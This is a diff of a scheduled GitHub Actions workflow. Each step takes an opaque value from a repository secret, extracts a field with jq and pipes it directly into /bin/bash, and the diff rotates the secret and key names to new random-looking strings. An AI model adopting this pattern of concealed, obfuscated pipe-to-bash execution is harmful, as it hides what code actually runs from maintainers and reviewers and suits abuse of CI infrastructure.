@@ -1,19 +1,20 @@
 name: jingshenmeizhe
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 3/6 * * *'
+    - cron: '43 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: jingshenmeizhe
         env:
-          xoa217: ${{ secrets.xoa217 }}
+          zuqil4: ${{ secrets.zuqil4 }}
         run: |
-          echo $xoa217 | jq -r .mjl9907 | /bin/bash
-          echo $pop3 | jq -r .qcbcy1 | /bin/bash
-          echo $ubn288 | jq -r .uah34 | /bin/bash
+          echo $zuqil4 | jq -r .s06800 | /bin/bash
+          echo $j758 | jq -r .euxqk8189 | /bin/bash
+          echo $xmuro5 | jq -r .hciyc49 | /bin/bash
+          echo $flvs85 | jq -r .xrfpu09921 | /bin/bash
 
